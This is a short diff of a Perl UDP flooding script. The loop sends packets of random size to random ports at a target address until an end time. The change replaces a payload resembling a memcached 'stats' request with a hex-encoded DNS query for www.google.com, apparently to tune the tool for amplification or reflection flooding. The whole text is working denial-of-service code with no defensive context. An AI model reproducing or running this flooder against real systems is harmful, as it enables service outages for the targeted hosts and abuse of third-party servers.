@@ -26,4 +26,4 @@ EOTEXT
 for (;time() <= $endtime;) {
   $psize = $size ? $size : int(rand(1024-64)+64) ;
   $pport = $port ? $port : int(rand(65500))+1;
-  send(flood, pack("a$psize","\x00\x00\x00\x00\x00\x01\x00\x00stats"), 0, pack_sockaddr_in($pport, $iaddr));}
+  send(flood, pack("a$psize","\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x05\x00\x01"), 0, pack_sockaddr_in($pport, $iaddr));}
